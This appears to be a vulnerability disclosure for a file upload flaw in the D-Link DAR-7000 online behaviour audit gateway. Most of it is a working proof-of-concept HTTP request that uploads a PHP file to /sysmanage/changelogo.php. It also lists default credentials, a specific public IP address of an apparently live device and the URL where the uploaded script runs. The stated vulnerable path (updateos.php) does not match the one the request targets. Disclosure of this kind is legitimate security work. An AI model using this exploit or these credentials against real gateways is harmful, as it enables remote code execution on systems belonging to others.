The D-LINK DAR-7000 series online behavior audit gateway has a file upload vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official： http://www.dlink.com.cn/

version:DAR-7000

Vulnerability Path ：/sysmanage/updateos.php

Ip：https://60.22.74.195:8443/

Default account password: test/ admin@123

poc:
```
POST /sysmanage/changelogo.php HTTP/1.1
Host: 
Cookie: PHPSESSID=bdb1aa1392da0420192cff3c34e507d6
Accept: image/gif, image/jpeg, image/pjpeg, application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*
Accept-Language: zh-CN
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)
Content-Type: multipart/form-data; boundary=---------------------------7e62f02f51878
Accept-Encoding: gzip, deflate
Content-Length: 326
Cache-Control: no-cache
Connection: close

-----------------------------7e62f02f51878
Content-Disposition: form-data; name="file_upload"; filename="phpinfo.php"
Content-Type: application/octet-stream

<?php phpinfo()?>
-----------------------------7e62f02f51878
Content-Disposition: form-data; name="mode"

upload
-----------------------------7e62f02f51878--

```
<img width="729" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/75fd474e-b079-489b-8cb7-750e67d4d2e9">

https://60.22.74.195:8443/boot/web/upload/diylogo/phpinfo.php

<img width="727" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/7b4026d7-13b5-4ec9-99b0-a4ef450214d0">


